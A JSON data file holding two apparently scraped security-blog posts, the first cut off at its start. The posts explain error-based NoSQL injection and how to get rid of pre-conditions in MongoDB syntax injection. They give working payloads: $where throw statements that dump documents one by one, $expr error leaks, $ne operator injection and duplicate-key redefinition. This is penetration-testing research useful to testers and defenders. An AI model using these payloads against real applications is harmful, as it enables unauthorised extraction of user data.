fast. The obvious prerequisite for this is that the web application provides error messages from the NoSQL server to the user.\\nAfter playing around a bit, I got it working in $where based injection, by making use of the throw command which causes an error condition to occur. For the error message argument of the throw command, we provide the this object, which refers to the current document. As a result, the error message shows the first full document. It stops at the first document, since the error prevents it from processing the rest. The payload we introduce is something like this:\\nthrow new Error(JSON. stringify(this))\\nIf we are introducing this into an existing $where clause, we need to make sure that the syntax is valid. The easiest way to do this is to escape any existing strings, start a new command with a ;, add in the throw command, and then end the command with a ; and get rid of the trailing ‘ with a ‘ of our own.\\nFor instance if we are injecting into the username value of this query:\\n{\\\"$where\\\":\\\"this. username='bob' && this. password=='1e23f41b2... ' \\\"}\\nWe provide \\n'; throw new Error(JSON. stringify(this));'\\nCausing the query to become:\\n{\\\"$where\\\":\\\"this. username=''; throw new Error(JSON. stringify(this)); '' && this. password=='1e23f41b2... '\\\"}\\nWe don’t really care about what happens after the throw command, as the error will prevent its execution. We just need it to be valid syntax. We could also use a null byte after the throw command, to remove all text after it.\\nIf we are not injecting into an $where, we may be able to add our own $where clause if we are dealing with syntax injection. For instance, if we are injecting into the username value of the following document:\\n{\\\"username\\\":\\\"bob\\\"}\\nwe provide\\n\\\",\\\"username\\\":{\\\"$ne\\\":\\\"\\\"},\\\"$where\\\":\\\"throw new Error(JSON. stringify(this))\\nSo that the query becomes\\n{\\\"username\\\":\\\"\\\", \\\"username\\\":{\\\"$ne\\\":\\\"\\\"},\\\"$where\\\":\\\"throw new Error(JSON. stringify(this))\\\"}\\nYou can see in the above payload that we redefine the username field, like we discussed in the first blog post, so that the query matches all users instead.\\nWhat if we would like to have the second, third or more document?\\nWe can make use of an if statement within the $where clause so that the throw command does not get executed in case it’s a document that we already have exfiltrated.\\nFor instance, if we already have exfiltrated the first user bob’s document, then we can do something like this to get the second user:\\nif (!['bob']. includes(this. username)) \\n{throw new Error(JSON. stringify(this))}\\nTo get the third user, we just add in the second user into the array , i. e.\\nif (!['bob','sue']. includes(this. username))\\n{throw new Error(JSON. stringify(this))}\\nThis isn’t the best approach since you need to specify each exfiltrated username. Instead we can make use of the disclosed _id field to specify to dump the document that has a larger _id value. We then only need to update the _id value each time, until we have cycled through them all. The payload for something like this would be:\\nif (this._id>'66d5ef7d01c52a87f75e739c') {throw new Error(JSON. stringify(this))}\\nWhere '66d5ef7d01c52a87f75e739c' is the last _id value you extracted.\\nYou can also make use of $expr and $function, to execute JS without $where. However, it’s not as useful, as you need to know the field names beforehand and you don’t have access to the current document. Instead, you only have access to the field names you provide. The syntax to exfiltrate the current document’s username field would look something like this:\\n$expr:{$function:{body:function(username){throw new Error(username);},args: [\\\"$username\\\"], lang: \\\"js\\\"}}\\nThis is a bit unwieldy. You can also make use of $expr and $function to cause an error condition. The idea is to cast a string value to an int, and then see the value in the error message. The syntax to extract the first document’s username field would be:\\n\\\"$expr\\\": {\\\"$toInt\\\": [\\\"$username\\\"]}\\nwhich is much shorter than the $function equivalent.\\nI’ve had fun using this to exfiltrate data from collections. I hope its useful for you.",
    "source": "https://sensepost.com/blog/2025/nosql-error-based-injection/",
    "metadata": {
      "title": "NoSQL error-based injection"
    }
  },

  {
    "content": "TL;DR: I found a cool way to get rid of pre-conditions in NOSQL syntax injections\\nI have been investigating NoSQL injection for a bit, trying to make it better, or at least somewhat equivalent to SQL injection. One of the things that are tricky with NoSQL injection is getting rid of pre- and post-conditions.\\nFor this post I’m focusing on MongoDB, so \\ns/NoSQL injection/Mongo injection/g\\nBackground\\nIn case you forgot, most MongoDB queries will look something like this in the background:\\ndb. users. find({\\\"username\\\":\\\"John\\\"})\\nIn this case we are querying the users collection for all documents that have a key called username and a corresponding value that’s set to John.\\nThe {“username”:”John”} bit is called a query filter.\\nThe following query will look for all documents with the key value pair of “username”:”John” set, as well as the key value pair of “title”:”Analyst”\\ndb. users. find({\\\" username\\\":\\\"John\\\" , \\\"title\\\":\\\"Analyst \\\" })\\nIn MongoDB, you can make use of query operators, like $ne and so forth to match specific conditions. For example, the following MongoDB query will match all documents that don’t have a key-value pair with the key being username and the value being John\\ndb. users. find( {\\\"username\\\": {\\\"$ne\\\":\\\"John\\\"} })\\nThere are a couple of variations of how NoSQL injection can occur.\\nThe first way is called operator injection, and it’s the one most people are familiar with.\\nA query operator expression is passed into a query filter, instead of a string. For example, we provide {“$ne”:””} as a username, causing the query to become:\\ndb. users. find( {\\\"username\\\": {\\\"$ne\\\":\\\"\\\"} })\\nThis matches all users, similar to the famous or ‘ 1=1 — SQL injection statement.\\nThe thing to understand about operator injection is that we are limited to the field we are injecting into. For example, if we are making use of operator injection, and we are injecting into the value of the username field, everything we provide will be seen as part of the query operator expression for the username field. No matter how we try, we won’t be able to affect the other fields in the query.\\nIn the query below, we want to return all values in the collection as before. We have injected our “: {“$ne”:””}, causing the query to return all documents that don’t have an empty username, but has the job field set to IT.\\ndb. users. find({\\\"username\\\":{\\\"$ne\\\":\\\"\\\"}, \\\"job\\\":\\\"IT\\\"})\\nTry as we might, nothing we provide will allow us to get rid of the “job”:”IT” clause.\\nThe second way one can inject into NoSQL is called syntax injection, and this is where we can actually alter the syntax of the query. Typically, this is due to the use of string concatenation or string interpolation while constructing the query. We find this type of injection often in $where clauses, or within the JSON query filter itself.\\nSyntax injection into $where\\nMongo has a $where clause that evaluates the documents based on specified conditions in a limited JavaScript engine. In practice, most people don’t use it for security and performance concerns, but let’s look at it just in case you find it.\\nIn a $where clause, the this object provides you access to the current document being processed. For instance, the query below will process each of the documents in the users collection and filter out the ones that has the value John set in the username field.\\ndb. users. find( {\\\"$where\\\":\\\" this. username=='John' \\\"} )\\nIf we are injecting into a $where clause, we can make use of JavaScript and MongoDB weirdness to cancel out any pre or post conditions, so that we completely control the results of the query.\\nFor instance, to obtain all documents in the users collection, we need to make the JavaScript in the $where clause to evaluate to true for all documents it evaluates. In JavaScript syntax ‘ or 1=1 becomes payload ‘||1\\nThis makes the query become:\\ndb. users. find( {\\\"$where\\\":\\\" this. username==''||1' \\\"} )\\nAs you can see, we have a trailing apostrophe we need to take care of, else the syntax won’t be valid.\\nTypically, people will use a ‘x to get past this, with a payload like ‘||1||’x\\nThis makes the query become\\ndb. users. find({\\\"$where\\\":\\\" this. username==''||1||'x' \\\"} )\\nIf we break this down, it says\\n\\nplease provide all documents where the username is empty (i. e. no documents),\\nor where 1 is a true value (all documents)\\nor where ‘x’ (all documents)\\n\\nIn JavaScript all non-empty strings evaluate to true in Boolean conditions, and empty strings to false. Weird right?\\nWe add in ‘x to our payload so that we can get rid of the trailing apostrophe. When the ‘x and the trailing ‘ is put together it becomes ‘x’ and because of JavaScript Boolean weirdness we can and this to our Boolean condition with ||, without changing the outcome. In this case the ‘x’ will actually not be evaluated at all, since we have the true value 1 already before the ‘x’, and once an or becomes true, the rest of the Boolean condition is ignored.\\nWe don’t need to make use of the ‘x trick – we can actually make use of a poison null byte in $where statements to get rid of everything following it. This is great for more complex $where clauses. For example, the payload ‘||1%00 which will make the following query\\ndb. users. find({ \\\"$where\\\":\\n\\\"this. username=='John'&&this. password=='a3b3f8a2f213fbfe…'\\\"})\\nbecome\\ndb. users. find({ \\\"$where\\\":\\\" this. username==''||1\\\" } )\\nIn a similar vein, you could also use ‘||’X which becomes\\ndb. users. find(\\\"$where\\\":{\\n\\\"this. username==''||'X'&&this. password=='a3b3f8a2f213fbfe…'})\\nSyntax injection into the JSON query filter (New Stuff)\\nIn this case, the developers are using string concatenation, or more likely string interpolation to construct the query filter, before making it into a JSON object, and passing it to MongoDB.\\nWe can thus add in our own query conditions. This is a bit of a game changer from operator injection, since we can now query on the fields we want, instead of being stuck inside an existing field.\\nFor instance, if we have the query\\ndb. users. find({\\\"job\\\":\\\"IT\\\"})\\nand we are injecting into the value of the job field, and we want to find all IT users who can login to the site, we can provide for instance IT”,”status”:”active to change the query to\\ndb. users. find({\\\"job\\\":\\\"IT\\\", \\\"status\\\":\\\"active\\\"})\\nThis is the equivalent to being able to add our own columns in a where clause in SQL injection. We can however be injecting into a spot that has both pre and post conditions, and since JSON doesn’t have a way to comment things out, it becomes a bit tricky to alter the queries to do what you want.\\nAfter playing around a bit, I found out that you can get rid of preconditions at least in MongoDB. In JSON, the key names in a document are supposed to be unique. If you have a document with two identical keys and different values, you are technically dealing with an invalid JSON document, but in reality, the actual value of the key will depend on what JSON parser is being used. A lot of the parsers follow the rule “last value wins”, which means that the value of the last identical key in the document will be used. For example, if we use such a parser on the JSON document\\n{\\\"id\\\":\\\"10\\\", \\\"id\\\":\\\"100\\\"}\\nthe value of the id field will be 100.\\nI found that MongoDB has the same behavior. As a practical example, consider the case where we are injecting into the username field of the following query, and we would like to get all users’ values:\\ndb. users. find({\\\"username\\\":\\\"bob\\\"})\\nWe could provide something like {“$ne”:””} however in this case it would become:\\ndb. users. find({\\\"username\\\":\\\"{\\\"$ne\\\":\\\"\\\"}\\\"})\\nIn this case, the payload is swallowed by a string, so nothing will happen. If we add in a “ to escape out of the string, we end up with a pre-condition, i. e. the username has to be blank.\\nFor example, in we inject “XXXXX we get\\ndb. users. find({\\\"username\\\":\\\"\\\" XXXXX\\\"})\\nTo thus get all users, we redefine the username key-value after escaping the string. The payload would be something like this “,”username”:{“$ne”:””}\\nCausing the query to become:\\ndb. users. find({\\\"username\\\":\\\"\\\", \\\"username\\\":{\\\"$ne\\\":\\\"\\\"} \\\"})\\nWe almost have it, but we are stuck with a trailing “\\nThis is pretty tricky to get past, as there isn’t any way to comment out things within JSON. One way I have found to deal with this, is to add an additional key value pair, that won’t affect the results, like “status”,”active” or some other field. We remove the last ” of this additional key value pair, so that when it is added to the query filter, it will take care of the trailing “ for us. This is similar to adding in ‘x like we did in the $where injection.\\nUnfortunately, this means that you need to know the name of such a field, which can be hard in itself. In this case, the payload would become “,”username”:{“$ne”:””},”status”:”active\\nmaking the query become\\ndb. users. find({\\\"username\\\":\\\"\\\",\\\"username\\\":{\\\"$ne\\\":\\\"\\\"},\\\"status\\\":\\\"active\\\"})\\nA better way to deal with this is to make use of $where. We add in a $where clause that will always return true, and in doing so take care of the trailing “. For instance, for our query we provide the payload\\n“,”username”:{“$ne”:””},”$where”:”1\\ncausing our query to become\\ndb. users. find({\\\"username\\\":\\\"\\\",\\\"username\\\":{\\\"$ne\\\":\\\"\\\"},\\\"$where\\\":\\\"1\\\"})\\nSweeeet! This works pretty well, and means we don’t need to really know any additional field names. I find it’s quite useful to inject $where sometimes, such as with error based NoSQL injection.\\nIn practice, we might not always be so lucky though – often times there are post-conditions after our injection point, and due to the “last value wins” we cannot override them. For instance, you are injecting into the username field of the following query\\ndb. users. find({\\\"username\\\":\\\"Bob\\\",\\\"password\\\":\\\"ae34fc6534f2c...\\\"})\\nthen you will only be able to match documents that have that specific password hash value. I haven’t found a good way to get rid of post conditions – If you know of a way tell me and I’ll buy you several beers.\\nHope this was helpful!",
    "source": "https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/",
    "metadata": {
      "title": "Getting rid of pre- and post-conditions in NoSQL injections"
    }
  }
]